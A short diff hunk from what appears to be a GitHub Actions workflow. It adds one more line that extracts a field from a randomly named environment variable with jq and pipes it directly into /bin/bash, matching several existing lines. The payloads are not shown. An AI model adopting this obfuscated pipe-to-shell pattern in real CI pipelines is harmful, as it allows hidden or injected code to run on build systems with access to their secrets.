@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$unrj07" | jq -r .daltd80 | /bin/bash
           printf '%s' "$y17" | jq -r .uxld7 | /bin/bash
           echo $sguu3 | jq -r .rvp5 | /bin/bash
+          printf '%s' "$easm398" | jq -r .jwnbs37 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
